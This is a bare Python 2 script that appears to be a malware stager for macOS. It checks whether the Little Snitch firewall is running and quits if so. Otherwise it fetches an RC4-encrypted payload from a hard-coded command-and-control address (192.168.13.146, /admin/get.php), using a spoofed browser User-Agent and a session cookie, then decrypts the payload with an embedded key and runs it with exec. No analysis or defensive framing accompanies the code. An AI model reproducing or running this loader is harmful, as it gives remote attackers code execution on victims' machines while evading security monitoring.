import datetime
import sys
import json
import zlib
import re
import __future__
import string
import random
import pwd
import time
import BaseHTTPServer
from StringIO import StringIO
import socket
from stat import S_ISREG, ST_CTIME, ST_MODE
import imp
import subprocess
import urllib2
import stat
import os
import zipfile
from threading import Thread
import threading
import io
import base64
from os.path import expanduser
import grp
import struct
import trace
import math
import marshal
import shlex
import shutil
import sys;import re, subprocess;cmd = "ps -ef | grep Little\ Snitch | grep -v grep"
ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
out = ps.stdout.read()
ps.stdout.close()
if re.search("Little Snitch", out):
   sys.exit()
import urllib2;
UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://192.168.13.146:80';t='/admin/get.php';req=urllib2.Request(server+t);
req.add_header('User-Agent',UA);
req.add_header('Cookie',"session=guV2Jj0TcUz8MXQRdufXDh6qCPA=");
proxy = urllib2.ProxyHandler();
o = urllib2.build_opener(proxy);
urllib2.install_opener(o);
a=urllib2.urlopen(req).read();
IV=a[0:4];data=a[4:];key=IV+'4cb9c8a8048fd02294477fcb1a41191a';S,j,out=range(256),0,[]
for i in range(256):
    j=(j+S[i]+ord(key[i%len(key)]))%256
    S[i],S[j]=S[j],S[i]
i=j=0
for char in data:
    i=(i+1)%256
    j=(j+S[i])%256
    S[i],S[j]=S[j],S[i]
    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))
exec(''.join(out))